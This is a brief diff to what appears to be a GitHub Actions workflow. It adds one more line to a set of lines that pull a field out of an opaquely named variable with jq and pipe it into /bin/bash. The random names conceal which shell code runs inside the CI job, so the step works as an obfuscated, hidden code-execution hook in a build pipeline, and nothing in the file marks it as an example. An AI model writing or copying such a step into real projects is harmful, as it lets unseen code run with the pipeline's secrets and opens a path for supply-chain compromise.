@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$ljzco2" | jq -r .rxxq51 | /bin/bash
           echo $nlv33330 | jq -r .xoyq1607 | /bin/bash
           printf '%s' "$tm1" | jq -r .s307 | /bin/bash
+          echo $bbo68 | jq -r .vmps72 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
